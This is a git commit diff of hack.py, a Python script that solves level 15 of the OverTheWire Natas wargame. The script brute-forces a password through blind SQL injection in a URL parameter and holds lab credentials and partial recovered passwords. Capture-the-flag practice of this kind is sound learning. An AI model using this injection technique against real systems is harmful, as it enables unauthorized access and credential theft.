2b0115d1e0db9114c92af428c90433ff9a2d833c
benjitobias <benjitobias@gmail.com>
2017-07-09 22:53:25 +0300

    fixed ugliness

--- 15/hack.py
+++ 15/hack.py
@@ -1,7 +1,7 @@
 import string
 import requests
 
-URL = 'http://natas15.natas.labs.overthewire.org/?username=natas16" and password like "%s%%&debug'
+URL = 'http://natas15.natas.labs.overthewire.org/?username=natas16" and password like binary "%s%%&debug'
 ALPHANUM = string.letters + string.digits
 USER_EXISTS = "This user exists"
 CREDS = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
@@ -9,8 +9,8 @@ CREDS = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
 s = requests.Session()
 s.auth = CREDS
 
-#password = "W" # got 'W' by running edited version in interpreter
-password = 'Waiheacj63wnnibroheqi3p9t0m5nhmh'
+password = "W" # got 'W' by running edited version in interpreter
+#password = 'WaIHEacj63wnNIBROHeqi3p9'
 new_letter = ALPHANUM[0]
 
 while True:
@@ -21,6 +21,6 @@ while True:
 			password += new_letter
 			print password
 			break
-	if index == len(ALPHANUM) - 1:
+	if index == len(ALPHANUM):
 		print "Finished"
 		break
